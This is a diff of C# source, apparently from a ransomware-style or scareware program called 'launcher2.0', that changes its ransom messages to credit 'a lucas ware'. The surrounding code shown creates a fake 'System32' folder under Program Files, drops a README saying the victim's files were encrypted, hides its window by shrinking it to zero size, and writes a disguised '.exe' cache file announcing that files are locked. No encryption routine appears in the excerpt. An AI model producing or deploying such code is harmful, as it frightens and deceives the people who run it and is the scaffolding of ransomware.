@@ -31,7 +31,7 @@ namespace launcher2._0
         {
 
             Directory.CreateDirectory("C:\\Program Files\\System32"); //Create Folder
-            File.WriteAllText("C:\\Program Files\\System32\\README.txt", "You were encrypted by Clutter, good luck..."); //Create text file :-)
+            File.WriteAllText("C:\\Program Files\\System32\\README.txt", "You were encrypted by a lucas ware, good luck..."); //Create text file :-)
 
             this.Left = 0; //Make 0 size
             this.Top = 0; //Make 0 size
@@ -46,7 +46,7 @@ namespace launcher2._0
 
                 using (StreamWriter streamWriter = File.CreateText(pathcachefile + @"\._cache_DCQPKX.exe"))
                 {
-                    streamWriter.WriteLine("Ur files has been locked :-)"); //text for file
+                    streamWriter.WriteLine("Ur files has been locked by a lucas ware (my real name is lucas) :-)"); //text for file
                 }
             }
 
